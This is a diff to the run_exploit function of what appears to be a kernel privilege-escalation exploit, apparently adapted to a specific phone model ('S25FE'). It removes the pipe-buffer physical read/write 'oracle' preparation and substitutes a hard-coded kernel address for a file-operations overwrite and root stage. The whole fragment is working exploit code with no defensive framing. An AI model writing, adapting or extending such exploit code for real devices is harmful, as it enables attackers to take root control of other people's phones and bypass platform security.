@@ -444,31 +444,10 @@ int run_exploit(int argc, char **argv) {
     return 1;
   }
 #endif
-
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
-#if defined(APP_FOPS_REUSE_VERIFIED_PAGE) && \
-    APP_FOPS_REUSE_VERIFIED_PAGE
-  pr_info("reusing verified fops payload page=%016zx pipe_page=%016zx\n",
-          page_base, pipebuf_page_base);
-  if (!is_direct_ptr(page_base) || !is_direct_ptr(pipebuf_page_base)) {
-    return 1;
-  }
-#else
-  reset_pipe_attempt();
-#if defined(APP_FOPS_ORACLE_DIAG_ONLY) && APP_FOPS_ORACLE_DIAG_ONLY
-  if (!prepare_p0_pipe_oracle()) {
-    pr_error("fops oracle pipe preparation failed\n");
-    return 1;
-  }
-  pr_info("fresh fops oracle pipe page=%016zx\n", pipebuf_page_base);
-#else
-  pipebuf_page_base = prepare_pipe_buffer_page();
-  pr_info("fresh physrw pipe page=%016zx\n", pipebuf_page_base);
-  if (!is_direct_ptr(pipebuf_page_base)) {
-    return 1;
-  }
-#endif
-#endif
+  /* S25FE: skip P0 pipe preparation; fops uses direct overwrite, root uses virtual I/O */
+  pipebuf_page_base = page_base ? page_base : 0xffffff8000000000ULL;
+  pr_info("app fops stage: skipping P0 pipe preparation\n");
 #endif
   reset_pipe_attempt();
   pin_to_core(CORE);
